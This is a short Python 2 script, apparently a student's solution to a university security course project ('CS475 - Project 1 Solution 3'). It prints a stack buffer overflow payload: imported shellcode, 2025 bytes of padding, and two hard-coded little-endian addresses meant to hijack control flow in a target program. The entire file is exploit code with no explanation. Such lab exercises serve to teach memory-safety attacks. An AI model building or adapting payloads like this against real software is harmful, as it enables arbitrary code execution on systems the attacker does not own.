#!/usr/bin/python
# CS475 - Project 1 Solution 3
#
from struct import pack
from shellcode import shellcode
print shellcode + "a"*2025+pack("<I",0xbffeaf98) + pack("<I",0xbffeb7ac)

